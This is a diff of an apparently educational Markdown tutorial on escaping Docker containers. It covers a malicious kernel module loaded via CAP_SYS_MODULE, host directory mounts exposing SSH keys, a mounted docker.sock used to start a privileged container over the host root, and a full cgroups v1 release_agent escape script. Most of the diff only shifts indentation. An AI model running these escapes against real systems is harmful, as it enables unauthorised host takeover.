@@ -5,9 +5,6 @@ date: 2026-10-24
 categories:
     - cloud
     - containers
-tags:
-    - docker
-    - container-escape
 ---
 
 # Page 1
@@ -30,41 +27,40 @@ The following conditions are required:
 *   The container must have the **`CAP_SYS_MODULE`** capability. Privileged containers usually have this capability. To check the current capabilities, run:
 
     ```bash
-    cat /proc/self/status | grep -i cap
+        cat /proc/self/status | grep -i cap
     ```
 
     Then decode the `CapEff` value:
 
     ```bash
-    capsh --decode="CapEff output"
+     capsh --decode="CapEff output"
     ```
 
     We should see `cap_sys_module` in the output.
-*   **Kernel module loading must be enabled.** We can check this with:
+ *   **Kernel module loading must be enabled.** We can check this with:
 
     ```bash
-    cat /proc/sys/kernel/modules_disabled
+        cat /proc/sys/kernel/modules_disabled
     ```
 
     A value of `0` means that kernel module loading has not been disabled.
-*   **Kernel module signature enforcement must not block unsigned modules.** We can check the `sig_enforce` parameter with:
+ *   **Kernel module signature enforcement must not block unsigned modules.** We can check the `sig_enforce` parameter with:
 
     ```bash
-    cat /sys/module/module/parameters/sig_enforce
+        cat /sys/module/module/parameters/sig_enforce
     ```
 
     If the output is `N`, unsigned kernel modules are not being strictly enforced by this setting.
 
-#### Example
+ #### Example
 
-<figure><img src="/assets/gitbook/tutorials/image (27).png" alt=""><figcaption></figcaption></figure>
+ <figure><img src="/assets/gitbook/tutorials/image (27).png" alt=""><figcaption></figcaption></figure>
 
-**Exploit: Creating a Malicious Kernel Module**
+ **Exploit: Creating a Malicious Kernel Module**
 
-Once all the required conditions are met, we can create a malicious kernel module and compile it using a `Makefile`.
+ Once all the required conditions are met, we can create a malicious kernel module and compile it using a `Makefile`.
 
-The following kernel module executes a command when it is loaded:
-
+ The following kernel module executes a command when it is loaded:
 ```c
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -122,7 +118,7 @@ clean:
 Run `make` to compile the module and generate the `.ko` file:
 
 ```bash
-make
+ make
 ```
 
 If the compilation is successful, we should have a file such as:
@@ -136,7 +132,7 @@ Malicious.ko
 We can then load the module using `insmod`:
 
 ```bash
-insmod Malicious.ko
+ insmod Malicious.ko
 ```
 
 If everything is configured correctly, the module will be loaded and its initialization function will execute.
@@ -158,7 +154,7 @@ However, the security impact depends on how the environment is configured and wh
 It's important to note that shared directories can be mounted as either read-only or read-write, depending on the administrator's requirements. When a directory is mounted as read-only, modifications made inside the container cannot affect the files on the host.
 
 ```bash
-docker run -it --name mounted_container -v /home:/hostsystem/home ubuntu:latest /bin/bash
+ docker run -it --name mounted_container -v /home:/hostsystem/home ubuntu:latest /bin/bash
 ```
 
 But what if the `john` user's home directory contains an SSH private key? If the container has access to that directory, the key may become accessible from inside the container. In a misconfigured environment, this could potentially allow an attacker to use the key to authenticate as `john` on the host.
@@ -204,14 +200,14 @@ If `/var/run/docker.sock` is mounted inside a container, processes inside that c
 First, we need to check whether the Docker socket is available inside the container:
 
 ```bash
-find / -name "docker.sock" 2>/dev/null
+ find / -name "docker.sock" 2>/dev/null
 ```
 
 Next, we should check the permissions of the socket:
 
 ```bash
-ls -lha /run/docker.sock
-srw-rw---- 1 root docker 0 Sep 22 15:56 /run/docker.sock
+ ls -lha /run/docker.sock
+ srw-rw---- 1 root docker 0 Sep 22 15:56 /run/docker.sock
 ```
 
 <figure><img src="/assets/gitbook/tutorials/image.png" alt=""><figcaption></figcaption></figure>
@@ -223,8 +219,8 @@ Because our user is a member of the `docker` group, we have permission to intera
 If the Docker client is not available inside the container, we can download one:
 
 ```bash
-wget -O /tmp/docker https://master.dockerproject.com/linux/x86_64/docker
-chmod +x /tmp/docker
+ wget -O /tmp/docker https://master.dockerproject.com/linux/x86_64/docker
+ chmod +x /tmp/docker
 ```
 
 **Step 3 — Interact with the Docker Socket**
@@ -236,7 +232,7 @@ The `-H` option specifies which Docker socket the client should use.
 A good first command is `ps`, which allows us to check whether we can list the running containers:
 
 ```bash
-/tmp/docker -H unix:///run/docker.sock ps
+ /tmp/docker -H unix:///run/docker.sock ps
 ```
 
 If the command works, we have successfully communicated with the Docker daemon through the socket.
@@ -246,7 +242,7 @@ If the command works, we have successfully communicated with the Docker daemon t
 If we have sufficient access to the Docker daemon, we can ask it to create a new privileged container and mount the host's root filesystem inside it.
 
 ```bash
-/tmp/docker -H unix:///run/docker.sock run --rm -it --privileged -v /:/hostsystem ubuntu bash
+ /tmp/docker -H unix:///run/docker.sock run --rm -it --privileged -v /:/hostsystem ubuntu bash
 ```
 
 Let's break down the command:
@@ -264,7 +260,7 @@ Let's break down the command:
 After starting the new container, we can check the mounted filesystem:
 
 ```bash
-root@new-container:/# ls /hostsystem/
+ root@new-container:/# ls /hostsystem/
 ```
 
 <figure><img src="/assets/gitbook/tutorials/image (1).png" alt=""><figcaption></figcaption></figure>
@@ -286,7 +282,7 @@ For more information, check out this video:
 First, check which cgroup version is being used:
 
 ```bash
-mount | grep cgroup
+ mount | grep cgroup
 ```
 
 <figure><img src="/assets/gitbook/tutorials/image (29).png" alt=""><figcaption></figcaption></figure>
@@ -300,23 +296,23 @@ However, when testing older systems or CTF machines, we may still encounter **cg
 If cgroups v1 is available, we can try the following:
 
 ```bash
-# 1. Mount the cgroup filesystem and create a child cgroup 'x'
-mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+ # 1. Mount the cgroup filesystem and create a child cgroup 'x'
+ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
-# 2. Enable notification on release for the new cgroup
-echo 1 > /tmp/cgrp/x/notify_on_release
+ # 2. Enable notification on release for the new cgroup
+ echo 1 > /tmp/cgrp/x/notify_on_release
 
-# 3. Find the container's path on the host, and set it as the release_agent script
-host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-echo "$host_path/cmd" > /tmp/cgrp/release_agent
+ # 3. Find the container's path on the host, and set it as the release_agent script
+ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+ echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
-# 4. Create the malicious script (/cmd) in the container's shared filesystem.
-echo '#!/bin/sh' > /cmd
-echo "ps aux > $host_path/output" >> /cmd   # The command to run on the host
-chmod a+x /cmd
+ # 4. Create the malicious script (/cmd) in the container's shared filesystem.
+ echo '#!/bin/sh' > /cmd
+ echo "ps aux > $host_path/output" >> /cmd   # The command to run on the host
+ chmod a+x /cmd
 
-# 5. Execute a process in the cgroup 'x' that immediately exits, triggering the payload
-sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+ # 5. Execute a process in the cgroup 'x' that immediately exits, triggering the payload
+ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
 The payload in this example runs `ps aux` and saves the output to the `output` file. This gives us a simple way to verify whether the `release_agent` executed in the host context.
